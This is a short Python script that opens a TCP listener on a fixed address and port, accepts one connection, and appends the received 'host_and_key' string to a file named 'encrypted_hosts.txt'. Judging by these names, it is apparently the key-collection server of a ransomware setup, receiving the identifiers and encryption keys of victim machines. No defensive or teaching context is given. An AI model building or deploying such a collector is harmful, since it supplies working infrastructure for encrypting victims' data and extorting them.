import socket


IP_ADDRESS = '192.168.44.1'
PORT = 50008

print('Creating Socket')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP_ADDRESS, PORT))
    print('Listening for connections...')
    s.listen(1)
    conn, addr = s.accept()
    print(f'Connection from {addr} established')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key+'\n')
            break
        print('Connection completed and closed!')